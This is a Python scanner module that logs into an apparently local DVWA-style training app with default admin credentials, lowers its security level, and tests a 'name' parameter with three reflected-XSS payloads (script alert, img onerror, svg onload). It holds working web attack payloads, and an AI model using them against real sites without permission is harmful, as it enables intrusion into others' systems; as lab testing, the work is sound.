import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init

def run(url, results):
    print('\nXSS')
    payloads = ['<script>alert("test")</script>',
    '<img src="x" onerror="alert("XSS")">',
    '<svg/onload=alert("XSS")>'
    ]
    
    session = requests.Session()
    r = session.get("http://localhost/login.php")
    soup = BeautifulSoup(r.text, "html.parser")
    token_input = soup.find("input", {"name": "user_token"})
    user_token = token_input.get("value")
    session.post("http://localhost/login.php", data={
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": user_token
    })
    r = session.get("http://localhost/security.php")
    soup = BeautifulSoup(r.text, "html.parser")
    token_input = soup.find("input", {"name": "user_token"})
    security_token = token_input.get("value")

    session.post("http://localhost/security.php", data={
        "security": "medium",
        "seclev_submit": "Submit",
        "user_token": security_token
    })
    xss_results = {}

    for payload in payloads:
        r = session.get(url, params={"name": payload})
        if payload in r.text:
            xss_results[payload] = 'vulnerable'
            print(Fore.RED + f'XSS Detected with payload: {payload}' + Style.RESET_ALL)
        else:
            xss_results[payload] = 'safe'
            print(Fore.GREEN + f'NO XSS Detected with payload: {payload}' + Style.RESET_ALL)
    
    results["XSS"] = xss_results